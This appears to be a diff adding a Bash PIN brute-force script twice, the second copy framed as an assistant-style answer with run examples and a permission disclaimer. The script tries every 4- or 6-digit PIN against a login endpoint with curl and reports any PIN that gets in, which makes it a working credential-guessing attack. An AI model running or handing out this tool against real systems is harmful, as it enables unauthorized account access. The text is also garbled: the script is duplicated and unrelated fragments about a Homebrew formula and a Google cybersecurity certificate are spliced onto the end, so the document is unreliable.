@@ -1,3 +1,286 @@
+#!/usr/bin/env bash
+# ==============================================================================
+# Script Name: pin_tester.sh
+# Description: Robust Bash PIN Enumeration & Rate-Limit Testing Script
+# Disclaimer: For authorized penetration testing, security auditing, and 
+#             educational purposes only. Unauthorized testing is illegal.
+# ==============================================================================
+
+# Colors for terminal styling
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+YELLOW='\033[1;33m'
+BLUE='\033[0;34m'
+NC='\033[0m' # No Color
+
+# Default configuration variables
+TARGET_URL=""
+PIN_LENGTH=4
+DELAY=1
+LOG_FILE="pin_test_results.log"
+SUCCESS_STRING=""
+HTTP_METHOD="POST"
+PARAM_NAME="pin"
+
+# Function to display help/usage instructions
+usage() {
+    echo -e "${BLUE}Usage:${NC} $0 -u <url> [options]"
+    echo -e "  -u <url>   Target URL endpoint (Required)"
+    echo -e "  -l <num>   PIN length (Default: 4, e.g., 4 for 0000-9999)"
+    echo -e "  -d <sec>   Delay in seconds between requests (Default: 1)"
+    echo -e "  -s <str>   Success string in response body to confirm a match (Optional)"
+    echo -e "  -m <method> HTTP Method: GET or POST (Default: POST)"
+    echo -e "  -p <name>  Parameter name for the PIN field (Default: pin)"
+    echo -e "  -h         Display this help message"
+    echo -e "\n${YELLOW}Example:${NC}"
+    echo -e "  $0 -u http://192.168.1.50/api/auth -l 4 -d 0.5 -s \"Welcome\""
+    exit 1
+}
+
+# Parse command line flags
+while getopts "u:l:d:s:m:p:h" opt; do
+    case ${opt} in
+        u) TARGET_URL="$OPTARG" ;;
+        l) PIN_LENGTH="$OPTARG" ;;
+        d) DELAY="$OPTARG" ;;
+        s) SUCCESS_STRING="$OPTARG" ;;
+        m) HTTP_METHOD=$(echo "$OPTARG" | tr '[:lower:]' '[:upper:]') ;;
+        p) PARAM_NAME="$OPTARG" ;;
+        h) usage ;;
+        *) usage ;;
+    esac
+done
+
+# Validate mandatory arguments
+if [ -z "$TARGET_URL" ]; then
+    echo -e "${RED}[!] Error: Target URL (-u) is required.${NC}"
+    usage
+fi
+
+# Ensure curl is installed
+if ! command -v curl &> /dev/null; then
+    echo -e "${RED}[!] Error: 'curl' is required but not installed. Please install it first.${NC}"
+    exit 1
+fi
+
+# Calculate range based on PIN length (e.g., length 4 -> 0 to 9999)
+MAX_VAL=$(( 10**PIN_LENGTH - 1 ))
+FORMAT_STR="%0${PIN_LENGTH}d"
+
+echo -e "${BLUE}========================================================${NC}"
+echo -e "${YELLOW}[*] Target URL        :${NC} $TARGET_URL"
+echo -e "${YELLOW}[*] PIN Length        :${NC} $PIN_LENGTH digits (00... to $(printf "$FORMAT_STR" $MAX_VAL))"
+echo -e "${YELLOW}[*] HTTP Method       :${NC} $HTTP_METHOD"
+echo -e "${YELLOW}[*] Request Delay     :${NC} ${DELAY}s"
+echo -e "${YELLOW}[*] Output Log        :${NC} $LOG_FILE"
+echo -e "${BLUE}========================================================${NC}"
+
+# Initialize log file
+echo "=== PIN Testing Started at $(date) ===" > "$LOG_FILE"
+START_TIME=$(date +%s)
+
+# Main execution loop
+for i in $(seq 0 $MAX_VAL); do
+    pin=$(printf "$FORMAT_STR" $i)
+    timestamp=$(date +"%T")
+    
+    # Send HTTP Request via curl, appending the status code to the output
+    if [ "$HTTP_METHOD" == "GET" ]; then
+        response=$(curl -s -w "\n%{http_code}" "$TARGET_URL?$PARAM_NAME=$pin")
+    else
+        response=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_URL" -d "$PARAM_NAME=$pin")
+    fi
+
+    # Separate body response and the HTTP status code (last line)
+    http_code=$(echo "$response" | tail -n1)
+    body=$(echo "$response" | sed '$d')
+
+    # Log/Print progress
+    log_entry="[$timestamp] Testing PIN: $pin | Status: $http_code"
+    echo -e "$log_entry" | tee -a "$LOG_FILE"
+
+    # Handle Rate Limiting / Lockouts
+    if [ "$http_code" -eq 429 ]; then
+        echo -e "${RED}[!] Rate limit triggered (HTTP 429 Too Many Requests). Aborting test to prevent lockouts.${NC}" | tee -a "$LOG_FILE"
+        break
+    elif [ "$http_code" -eq 403 ]; then
+        echo -e "${YELLOW}[!] Potential block/forbidden trigger (HTTP 403). Review target state.${NC}" | tee -a "$LOG_FILE"
+    fi
+
+    # Check for success criteria
+    if [ -n "$SUCCESS_STRING" ]; then
+        if echo "$body" | grep -q "$SUCCESS_STRING"; then
+            echo -e "${GREEN}[+] SUCCESS! Valid PIN discovered: $pin${NC}" | tee -a "$LOG_FILE"
+            break
+        fi
+    else
+        # Fallback heuristic if no success string is provided
+        if [ "$http_code" -eq 200 ] && ! echo "$body" | grep -qiE "invalid|failed|error|incorrect"; then
+            echo -e "${GREEN}[+] Potential Match (HTTP 200 without error text): $pin${NC}" | tee -a "$LOG_FILE"
+        fi
+    fi
+
+    # Enforce delay between requests
+    sleep "$DELAY"
+done
+
+# Calculate total execution time
+END_TIME=$(date +%s)
+DURATION=$(( END_TIME - START_TIME ))
+
+echo -e "${BLUE}========================================================${NC}"
+echo -e "${BLUE}[*] Scan finished in ${DURATION} seconds.${NC}" | tee -a "$LOG_FILE"
+echo -e "${BLUE}========================================================${NC}"
+./pin_tester.sh -u http://192.168.1.100/login -l 4
+./pin_tester.sh -u http://target-app.local/auth.php -l 6 -d 0.5 -s "Dashboard" -p "passcode"
+Here is a complete, feature-rich Bash script designed for authorized PIN enumeration and rate-limit testing against web endpoints, APIs, or login portals.
+It includes argument parsing, support for both GET and POST methods, customizable PIN lengths (e.g., 4-digit or 6-digit), automatic lockout/rate-limit detection (HTTP 429), success string matching, and automated logging.
+Full Bash Script: pin_tester.sh
+Save the following code as pin_tester.sh, make it executable using chmod +x pin_tester.sh, and run it in your terminal.
+#!/usr/bin/env bash
+# ==============================================================================
+# Script Name: pin_tester.sh
+# Description: Robust Bash PIN Enumeration & Rate-Limit Testing Script
+# Disclaimer: For authorized penetration testing, security auditing, and 
+#             educational purposes only. Unauthorized testing is illegal.
+# ==============================================================================
+
+# Colors for terminal styling
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+YELLOW='\033[1;33m'
+BLUE='\033[0;34m'
+NC='\033[0m' # No Color
+
+# Default configuration variables
+TARGET_URL=""
+PIN_LENGTH=4
+DELAY=1
+LOG_FILE="pin_test_results.log"
+SUCCESS_STRING=""
+HTTP_METHOD="POST"
+PARAM_NAME="pin"
+
+# Function to display help/usage instructions
+usage() {
+    echo -e "${BLUE}Usage:${NC} $0 -u <url> [options]"
+    echo -e "  -u <url>   Target URL endpoint (Required)"
+    echo -e "  -l <num>   PIN length (Default: 4, e.g., 4 for 0000-9999)"
+    echo -e "  -d <sec>   Delay in seconds between requests (Default: 1)"
+    echo -e "  -s <str>   Success string in response body to confirm a match (Optional)"
+    echo -e "  -m <method> HTTP Method: GET or POST (Default: POST)"
+    echo -e "  -p <name>  Parameter name for the PIN field (Default: pin)"
+    echo -e "  -h         Display this help message"
+    echo -e "\n${YELLOW}Example:${NC}"
+    echo -e "  $0 -u http://192.168.1.50/api/auth -l 4 -d 0.5 -s \"Welcome\""
+    exit 1
+}
+
+# Parse command line flags
+while getopts "u:l:d:s:m:p:h" opt; do
+    case ${opt} in
+        u) TARGET_URL="$OPTARG" ;;
+        l) PIN_LENGTH="$OPTARG" ;;
+        d) DELAY="$OPTARG" ;;
+        s) SUCCESS_STRING="$OPTARG" ;;
+        m) HTTP_METHOD=$(echo "$OPTARG" | tr '[:lower:]' '[:upper:]') ;;
+        p) PARAM_NAME="$OPTARG" ;;
+        h) usage ;;
+        *) usage ;;
+    esac
+done
+
+# Validate mandatory arguments
+if [ -z "$TARGET_URL" ]; then
+    echo -e "${RED}[!] Error: Target URL (-u) is required.${NC}"
+    usage
+fi
+
+# Ensure curl is installed
+if ! command -v curl &> /dev/null; then
+    echo -e "${RED}[!] Error: 'curl' is required but not installed. Please install it first.${NC}"
+    exit 1
+fi
+
+# Calculate range based on PIN length (e.g., length 4 -> 0 to 9999)
+MAX_VAL=$(( 10**PIN_LENGTH - 1 ))
+FORMAT_STR="%0${PIN_LENGTH}d"
+
+echo -e "${BLUE}========================================================${NC}"
+echo -e "${YELLOW}[*] Target URL        :${NC} $TARGET_URL"
+echo -e "${YELLOW}[*] PIN Length        :${NC} $PIN_LENGTH digits (00... to $(printf "$FORMAT_STR" $MAX_VAL))"
+echo -e "${YELLOW}[*] HTTP Method       :${NC} $HTTP_METHOD"
+echo -e "${YELLOW}[*] Request Delay     :${NC} ${DELAY}s"
+echo -e "${YELLOW}[*] Output Log        :${NC} $LOG_FILE"
+echo -e "${BLUE}========================================================${NC}"
+
+# Initialize log file
+echo "=== PIN Testing Started at $(date) ===" > "$LOG_FILE"
+START_TIME=$(date +%s)
+
+# Main execution loop
+for i in $(seq 0 $MAX_VAL); do
+    pin=$(printf "$FORMAT_STR" $i)
+    timestamp=$(date +"%T")
+    
+    # Send HTTP Request via curl, appending the status code to the output
+    if [ "$HTTP_METHOD" == "GET" ]; then
+        response=$(curl -s -w "\n%{http_code}" "$TARGET_URL?$PARAM_NAME=$pin")
+    else
+        response=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_URL" -d "$PARAM_NAME=$pin")
+    fi
+
+    # Separate body response and the HTTP status code (last line)
+    http_code=$(echo "$response" | tail -n1)
+    body=$(echo "$response" | sed '$d')
+
+    # Log/Print progress
+    log_entry="[$timestamp] Testing PIN: $pin | Status: $http_code"
+    echo -e "$log_entry" | tee -a "$LOG_FILE"
+
+    # Handle Rate Limiting / Lockouts
+    if [ "$http_code" -eq 429 ]; then
+        echo -e "${RED}[!] Rate limit triggered (HTTP 429 Too Many Requests). Aborting test to prevent lockouts.${NC}" | tee -a "$LOG_FILE"
+        break
+    elif [ "$http_code" -eq 403 ]; then
+        echo -e "${YELLOW}[!] Potential block/forbidden trigger (HTTP 403). Review target state.${NC}" | tee -a "$LOG_FILE"
+    fi
+
+    # Check for success criteria
+    if [ -n "$SUCCESS_STRING" ]; then
+        if echo "$body" | grep -q "$SUCCESS_STRING"; then
+            echo -e "${GREEN}[+] SUCCESS! Valid PIN discovered: $pin${NC}" | tee -a "$LOG_FILE"
+            break
+        fi
+    else
+        # Fallback heuristic if no success string is provided
+        if [ "$http_code" -eq 200 ] && ! echo "$body" | grep -qiE "invalid|failed|error|incorrect"; then
+            echo -e "${GREEN}[+] Potential Match (HTTP 200 without error text): $pin${NC}" | tee -a "$LOG_FILE"
+        fi
+    fi
+
+    # Enforce delay between requests
+    sleep "$DELAY"
+done
+
+# Calculate total execution time
+END_TIME=$(date +%s)
+DURATION=$(( END_TIME - START_TIME ))
+
+echo -e "${BLUE}========================================================${NC}"
+echo -e "${BLUE}[*] Scan finished in ${DURATION} seconds.${NC}" | tee -a "$LOG_FILE"
+echo -e "${BLUE}========================================================${NC}"
+
+How to Run and Customize
+ * Basic POST Request Test:
+   ./pin_tester.sh -u http://192.168.1.100/login -l 4
+
+ * Advanced Test (Custom Delay, Success Phrase, and Parameter):
+   ./pin_tester.sh -u http://target-app.local/auth.php -l 6 -d 0.5 -s "Dashboard" -p "passcode"
+
+> Security & Compliance Note: Always ensure you have explicit written permission from the asset owner before executing enumeration or stress-testing scripts against any network interface or web application.
+> 
+
 Formula/c/chart-releaser.rb3. Academic Credits, Google Programs, & Degree Pathways
 Google sponsors and supports several cybersecurity education initiatives:
 Google Cybersecurity Certificate: Hosted on Coursera, this program is evaluated by the American Council on Education (ACE®). Completing the program can earn up to 9 college credits toward participating degree programs (e.g., Western Governors University, National University).
